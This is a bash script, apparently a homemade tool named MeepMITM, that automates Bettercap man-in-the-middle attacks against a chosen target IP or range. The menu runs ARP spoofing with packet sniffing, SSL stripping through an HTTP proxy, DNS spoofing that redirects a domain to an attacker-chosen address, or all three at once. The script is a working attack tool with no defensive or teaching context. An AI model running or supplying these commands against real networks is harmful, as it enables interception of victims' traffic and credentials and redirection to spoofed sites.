#!/bin/bash
# MeepMITM - Bettercap MITM Automation Tool
# Author: YourName
# Version: 1.0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "  __  __ _____ _____ __  __ _______ _______ "
echo " |  \/  |_   _|_   _|  \/  |__   __|__   __|"
echo " | \  / | | |   | | | \  / |  | |     | |   "
echo " | |\/| | | |   | | | |\/| |  | |     | |   "
echo " | |  | |_| |_ _| |_| |  | |  | |     | |   "
echo " |_|  |_|_____|_____|_|  |_|  |_|     |_|   "
echo -e "${NC}"
echo -e "${YELLOW}        Bettercap MITM Automation${NC}"
echo -e "${YELLOW}-----------------------------------------${NC}"

# Check root
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}[!] This script must be run as root${NC}" >&2
    exit 1
fi

# Check if bettercap is installed
if ! command -v bettercap &> /dev/null; then
    echo -e "${YELLOW}[+] Installing Bettercap...${NC}"
    apt-get update && apt-get install -y bettercap
fi

# Menu
echo -e "\n${GREEN}[1] Basic ARP Spoofing (MITM)"
echo "[2] MITM with HTTP/HTTPS Sniffing"
echo "[3] MITM with DNS Spoofing"
echo "[4] Full Attack (ARP+HTTP+DNS)"
echo "[5] Exit${NC}"

read -p "Select an option [1-5]: " option

case $option in
    1)
        # Basic ARP Spoofing
        read -p "Enter target IP (or range): " target
        read -p "Enter gateway IP: " gateway
        read -p "Enter network interface: " interface
        echo -e "${YELLOW}[+] Starting ARP Spoofing MITM...${NC}"
        bettercap -iface $interface -eval "set arp.spoof.targets $target; set arp.spoof.whitelist $gateway; arp.spoof on; net.sniff on"
        ;;
    2)
        # MITM with HTTP/HTTPS Sniffing
        read -p "Enter target IP (or range): " target
        read -p "Enter gateway IP: " gateway
        read -p "Enter network interface: " interface
        echo -e "${YELLOW}[+] Starting MITM with HTTP/HTTPS Sniffing...${NC}"
        bettercap -iface $interface -eval "set arp.spoof.targets $target; set arp.spoof.whitelist $gateway; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
        ;;
    3)
        # MITM with DNS Spoofing
        read -p "Enter target IP (or range): " target
        read -p "Enter gateway IP: " gateway
        read -p "Enter network interface: " interface
        read -p "Enter domain to spoof: " domain
        read -p "Enter fake IP: " fake_ip
        echo -e "${YELLOW}[+] Starting MITM with DNS Spoofing...${NC}"
        bettercap -iface $interface -eval "set arp.spoof.targets $target; set arp.spoof.whitelist $gateway; arp.spoof on; set dns.spoof.domains $domain; set dns.spoof.address $fake_ip; dns.spoof on; net.sniff on"
        ;;
    4)
        # Full Attack
        read -p "Enter target IP (or range): " target
        read -p "Enter gateway IP: " gateway
        read -p "Enter network interface: " interface
        read -p "Enter domain to spoof: " domain
        read -p "Enter fake IP: " fake_ip
        echo -e "${YELLOW}[+] Starting Full MITM Attack...${NC}"
        bettercap -iface $interface -eval "set arp.spoof.targets $target; set arp.spoof.whitelist $gateway; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; set dns.spoof.domains $domain; set dns.spoof.address $fake_ip; dns.spoof on; net.sniff on"
        ;;
    5)
        echo -e "${YELLOW}[+] Exiting...${NC}"
        exit 0
        ;;
    *)
        echo -e "${RED}[!] Invalid option${NC}"
        exit 1
        ;;
esac
